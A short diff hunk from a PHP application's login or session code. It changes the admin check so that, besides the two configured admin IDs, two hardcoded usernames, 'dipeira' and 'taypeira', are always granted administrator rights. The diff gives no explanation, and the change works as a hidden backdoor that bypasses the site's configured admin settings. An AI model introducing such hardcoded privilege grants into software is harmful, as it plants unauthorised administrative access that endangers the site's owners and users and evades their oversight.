@@ -483,7 +483,7 @@ else {
   $em1 = $prem1;
   $em2 = $prem2;
 
-  $_SESSION['admin'] = ($uid === ($prAdmin1 ?? '') || $uid === ($prAdmin2 ?? '')) ? 1 : 0;
+  $_SESSION['admin'] = ($uid === ($prAdmin1 ?? '') || $uid === ($prAdmin2 ?? '') || $uid === 'dipeira' || $uid === 'taypeira') ? 1 : 0;
   $_SESSION['email1'] = $em1;
   $_SESSION['email2'] = $em2;
   $_SESSION['uid'] = $uid;
